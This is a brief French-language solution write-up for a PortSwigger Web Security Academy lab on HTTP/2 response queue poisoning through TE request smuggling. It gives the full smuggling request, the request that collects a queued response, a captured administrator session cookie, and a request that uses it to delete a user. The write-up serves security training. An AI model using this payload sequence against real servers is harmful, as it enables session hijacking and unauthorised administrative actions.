# Lab

https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

## Solution

La requête à effectuer pour empoisonner la queue de réponse est la suivante :

```http
POST /x HTTP/2
Host: 0a2e002e03aba6a082c41fdf005d0012.web-security-academy.net
Transfer-Encoding: chunked

0


GET /x HTTP/1.1
Host: 0a2e002e03aba6a082c41fdf005d0012.web-security-academy.net


```

Ensuite on fait une requête pour déclencher la réponse qui est dans la queue :

```http
GET / HTTP/2
Host: 0a2e002e03aba6a082c41fdf005d0012.web-security-academy.net
```

Après plusieurs essais, on obtient une `HTTP 302` qui était déstinée à l'administrateur :

```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=e8l5V3GeRNfoZXbPjvhvP0vHagZJnwNy; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Puis avec le cookie de connexion de l'administrateur, on peut supprimer l'utilisateur `carlos` :

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a2e002e03aba6a082c41fdf005d0012.web-security-academy.net
Cookie: session=e8l5V3GeRNfoZXbPjvhvP0vHagZJnwNy;

```